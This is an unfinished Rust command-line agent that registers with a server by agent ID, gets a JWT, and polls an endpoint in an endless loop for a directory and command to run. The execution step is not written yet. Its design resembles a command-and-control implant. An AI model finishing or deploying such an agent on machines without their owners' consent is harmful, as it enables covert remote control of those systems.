use clap::{builder::Str, Parser};
use reqwest;
use serde_json::{Map, Result, Value};
use serde::{Deserialize, Serialize};
use std::{any::Any, collections::HashMap, ops::Index, str::FromStr};
use reqwest::Error;
use std::process::Command;
use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// token for agent (hashed id)
    #[arg(short, long)]
    agent_id: String,

    /// agent url
    #[arg(short, long)]
    url: String,
}
#[derive(Deserialize, Debug)]
struct RegisterResponse {
    message: String,
}

#[derive(Deserialize, Debug)]
struct CMDResponse {
    message: CMDInternalResp,
}

#[derive(Deserialize, Debug)]
struct CMDInternalResp {
    dir: String,
    cmd: String,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let agentid = args.agent_id;
    let url = args.url;

    let jwt_token = register(&agentid, &url).await;

    loop {
        let cmdResp = get_command(&jwt_token, &url, &agentid).await;
        let dir = cmdResp.dir;
        let cmd = cmdResp.cmd;
        

    }
}


async fn register(agent_id: &String, url: &String) -> String {
    // returns the jwt for the agent
    let mut new_url = url.clone();
    new_url.push_str(agent_id);
    let response = reqwest::get(new_url).await.unwrap();
    let result: RegisterResponse = response
        .json()
        .await
        .expect("Failed to parse JSON response");

    let token = result.message.to_string();
    if token != "404".to_string(){
        return token;
    }
    else {
        std::process::exit(1);
    };
}

async fn get_command(token: &String, url: &String, agent_id: &String) -> CMDInternalResp {
    let mut new_url = url.clone();
    new_url.push_str(agent_id);
    new_url.push_str("/plan");
    let agent_token = format!("{}", token);

    let mut headers = HeaderMap::new();
    headers.insert(
        AUTHORIZATION,
        HeaderValue::from_str(&agent_token).unwrap(), // handle error as needed
    );
    let response = reqwest::Client::new().get(new_url).headers(headers).send().await.unwrap();
    let result: CMDResponse = response
        .json()
        .await
        .expect("Failed to parse JSON response");

    let data = result.message;
    return data;
}


